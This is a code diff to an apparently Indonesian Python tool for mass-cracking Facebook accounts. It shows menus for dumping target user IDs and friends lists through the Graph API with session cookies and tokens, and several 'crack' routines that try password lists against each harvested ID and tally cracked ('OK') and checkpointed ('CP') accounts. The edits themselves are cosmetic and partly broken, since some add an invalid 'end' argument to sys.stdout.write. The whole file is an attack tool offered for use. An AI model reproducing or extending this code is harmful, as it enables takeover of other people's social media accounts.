@@ -380,7 +380,7 @@ def login_lagi334():
     except Exception as e:
         os.system("rm -f .token.txt")
         os.system("rm -f .cok.txt")
-        print(f' [•]{H2} Login Gagal..... Cek Tumbal Lu Bng !!!!')
+        print(f' [•]{M2} Login Gagal..... Cek Tumbal Lu Bng !!!!')
         exit()
 #------------------[ BAGIAN LOGIN ]----------------#
 def login_menu():
@@ -400,8 +400,6 @@ def login_menu():
        loading()
        clear()
     except IOError:
-       print(f'  [•][bold green] Sedang Mengecek Tumbal..... !!!! ')
-       time.sleep(1)
        print(' [•][bold red] Cookies Expired, login ulang kontol !!!')
        time.sleep(2)
        loading()
@@ -421,7 +419,7 @@ def login_menu():
         massal()
     elif ___Sllowly_ID____ in ['2']:
         print(nel(f'\t\t [bold blue]Publik Crack',width=90, padding=(0, 8), style=f"bold purple"))
-        idt = input(f'\n✶ ━━⫸ {H2} Masukkan ID Target  : {m}')
+        idt = input(f'\n✶ ━━⫸ {U} Masukkan ID Target  : {m}')
         dump(idt,"",{"cookie":cok},token)
         setting()
     elif ___Sllowly_ID____ in ['3']:
@@ -704,7 +702,7 @@ def result():
 		back()
 ###----------[ CRACK MASSAL ]----------###
 def massal():
-	prints(nel(f'                         [bold blue]Massal Crack')) 
+	prints(nel(f'                         [bold blue]Massal Crack',style=f"bold purple"))
 	try:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
@@ -741,7 +739,7 @@ def massal():
 	           'fields': "friends"
 	           }	           
 	       )
-	       url = requests.get('https://graph.facebook.com/{idt}'.format(user),params=params,headers=head,cookies=cookie).json()
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies=cookie).json()
 	       for xr in url['friends']['data']:
 	           try:
 	               woy = (xr['id']+'|'+xr['name'])
@@ -753,7 +751,7 @@ def massal():
 	    except requests.exceptions.ConnectionError:
 	        exit()
 	try:
-	      print("[bold green]╰─▶ [bold purple]Total DUMP  :{asu} "+str(len(id))) 
+	      print("[bold green]╰─▶ [purple]Total DUMP{N}  : "+str(len(id))) 
 	      setting()
 	except requests.exceptions.ConnectionError:
 	    exit()
@@ -803,7 +801,7 @@ def Dump_Massal():
 		back()
 ###----------[ ATUR SBLUM KREK ]----------###
 def setting():
-	cetak(nel(f"                        [bold blue]login ID Crack", title=f"{asu}{len(id)}{B} ID TELAH DIKUMPULKAN", style=f"bold purple"))
+	cetak(nel(f"                        [bold blue]login ID Crack", title=f"    {asu}{len(id)}{B} ID TELAH DIKUMPULKAN", style=f"bold purple"))
 	print(f"{H2}╰─▶ {B2}01 [bold purple]Facebook ID {M2}Old\n")
 	print(f"{H2}╰─▶ {B2}02 [bold purple]Facebook ID {K2}New\n")
 	print(f"{H2}╰─▶ {B2}03 [bold purple]Facebook ID {H2}Random\n")
@@ -928,13 +926,13 @@ def passwrd():
 				pool.submit(rr071,idf,pwv)
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
 	print(f'[•]{K2} CP : {K2}%s '%(cp))
-
+	exit()
 #-------------------[ METODE-B-API ]-----------------#
 def rr071(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ses = requests.Session()
-	sys.stdout.write(f"\r[{bo}RR07 v1{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{idf}{x}]"),
+	sys.stdout.write(f"\r[{bo}RR07 v1{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{idf}{x}]",end=' ')
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
@@ -993,7 +991,7 @@ def rr072(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ses = requests.Session()
-	sys.stdout.write(f"\r[{bo}RR07 v2{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{idf}{x}]"),
+	sys.stdout.write(f"\r[{bo}RR07 v2{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{idf}{x}]",end=' ')
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
@@ -1036,7 +1034,7 @@ def rr072(idf,pwv):
 def rr073(idf,pwv):
 	global loop,ok,cp
 	ua = random.choice(ugen)
-	sys.stdout.write(f"\r[{bo}RR07 v3{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{idf}{x}]"),
+	sys.stdout.write(f"\r[{bo}RR07 v3{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{idf}{x}]",end=' ')
 	sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
@@ -1091,7 +1089,7 @@ def rr073(idf,pwv):
 ###-----[ METODE VALIDATE ]-----###
 def rr074(uid,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r[{bo}RR07 v4{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{uid}{x}]"),
+	sys.stdout.write(f"\r[{bo}RR07 v4{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{uid}{x}]",end=' ')
 	sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
@@ -1126,7 +1124,7 @@ def rr074(uid,pwv):
 ###-----[ METODE ASYNC ]-----###
 def rr075(uid,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r[{bo}RR07 v5{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{uid}{x}]"),
+	sys.stdout.write(f"\r[{bo}RR07 v5{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{uid}{x}]",end=' ')
 	sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
@@ -1206,7 +1204,7 @@ def rr076(uid,pwv):
 ###-----[ METODE MESSENGER ]-----###
 def rr077(uid,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r[{bo}RR07 v7{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{uid}{x}]"),
+	sys.stdout.write(f"\r[{bo}RR07 v7{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{uid}{x}]",end=' ')
 	sys.stdout.flush()
 	ses = requests.Session()
 	while True:
